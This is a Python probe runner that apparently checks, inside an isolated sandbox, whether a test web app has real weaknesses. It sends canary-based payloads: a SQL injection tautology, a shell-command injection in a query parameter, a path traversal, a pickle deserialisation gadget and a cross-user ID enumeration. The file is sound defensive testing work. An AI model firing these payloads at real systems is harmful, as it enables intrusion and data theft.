"""Runs INSIDE the isolated range process (no network namespace, empty env, rlimits, temporary copy).

Usage: python -I probe_runner.py <spec.json>. Prints one JSON object. Probes are non-destructive: each proves a
weakness with a canary value (a computed number or a planted file) rather than by causing damage.
"""

import importlib
import json
import pickle
import sys
from pathlib import Path


class _Gadget:
    def __init__(self, n):
        self.n = n

    def __reduce__(self):  # proves attacker-chosen callable invocation (pow) without side effects
        return (pow, (self.n, 2))


def main() -> None:
    spec = json.loads(Path(sys.argv[1]).read_text())
    root = Path(spec["root"])
    sys.path.insert(0, str(root))
    meta = json.loads((root / "range.json").read_text())
    from fastapi.testclient import TestClient

    mod = importlib.import_module(meta["module"])
    client = TestClient(getattr(mod, meta["app_variable"]))
    ids = meta["identities"]
    user, other = list(ids)[0], list(ids)[1]
    hdr = {meta["auth_header"]: ids[user]} if spec.get("authenticated") else {}
    method, path, param = spec["http_method"], spec["path"], spec.get("param")
    canary = int(spec["canary"])
    out: dict = {"method": spec["method"], "requests": []}

    def call(params=None, content=None, p=path):
        r = client.request("GET" if method in ("GET", "ANY") else method, p, params=params, content=content, headers=hdr)
        out["requests"].append({"path": p, "params": params, "status": r.status_code, "body_excerpt": r.text[:300]})
        return r

    m = spec["method"]
    if m == "probe_sqli_tautology":
        base = call({param: f"__nonexistent_{canary}__"})
        atk = call({param: "x' OR '1'='1"})
        rows = atk.json() if atk.status_code == 200 and atk.headers.get("content-type", "").startswith("application/json") else []
        leaked = [r for r in rows if isinstance(r, dict) and r.get("owner") not in (None, user)]
        out["reproduced"] = base.status_code == 200 and len(rows) > len(base.json() or []) and bool(leaked)
        out["evidence"] = f"tautology returned {len(rows)} rows, {len(leaked)} owned by other users"
    elif m == "probe_cmd_canary":
        r = call({param: f"x; echo $(({canary}*7))"})
        out["reproduced"] = str(canary * 7) in r.text
        out["evidence"] = "shell evaluated injected arithmetic" if out["reproduced"] else "payload not evaluated by a shell"
    elif m == "probe_traversal_canary":
        r = call({param: "../secret_canary.txt"})
        out["reproduced"] = str(canary) in r.text
        out["evidence"] = "canary outside the file base was returned" if out["reproduced"] else f"status {r.status_code}, canary not returned"
    elif m == "probe_pickle_callable":
        r = call(content=pickle.dumps(_Gadget(canary)))
        out["reproduced"] = str(canary * canary) in r.text
        out["evidence"] = "deserialisation invoked an attacker-chosen callable" if out["reproduced"] else f"status {r.status_code}"
    elif m == "probe_idor_cross_user":
        leaked = []
        for i in range(1, 8):
            r = call(p=path.replace("{" + param + "}", str(i)))
            if r.status_code == 200 and r.json().get("owner") not in (None, user):
                leaked.append(i)
        out["reproduced"] = bool(leaked)
        out["evidence"] = f"{user} read objects owned by {other}: ids {leaked}" if leaked else "no cross-user object returned"
    else:
        out["reproduced"] = False
        out["error"] = f"unknown method {m}"
    if spec.get("functional_tests") and (root / meta.get("functional_tests", "")).is_file():
        ft = importlib.import_module(Path(meta["functional_tests"]).stem)
        out["functional"] = [{"check": c, "passed": ok} for c, ok in ft.run(client)]
    print(json.dumps(out))


if __name__ == "__main__":
    main()
